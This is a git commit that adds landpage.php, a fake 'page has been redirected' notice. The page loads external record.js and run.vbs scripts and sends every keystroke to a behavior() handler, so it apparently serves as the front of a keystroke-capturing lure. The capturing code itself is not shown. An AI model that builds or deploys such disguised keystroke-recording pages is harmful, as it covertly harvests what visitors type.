f7b77336e3cf2f66021f79a7a5dddef8fe6d7ae5
Sarbesh Kumar Sarkar <sarbeshsarkarsks@gmail.com>
2017-05-09 19:40:13 +0530

    Create landpage.php

---
+++ landpage.php
@@ -0,0 +1,14 @@
+<html>
+<head>
+<SCRIPT language="JavaScript" SRC="record.js"></SCRIPT>
+<script type="text/vbscript" src="run.vbs"></script>
+<script language="text/Javascript"> alert("Page redirected") </script>
+</head>
+
+<body onkeyup="behavior(event)">
+
+<h1>Sorry!</h1> <p>but the page you are looking for has been</p> <a href= >Redirected </a>
+
+</body>
+
+</html>
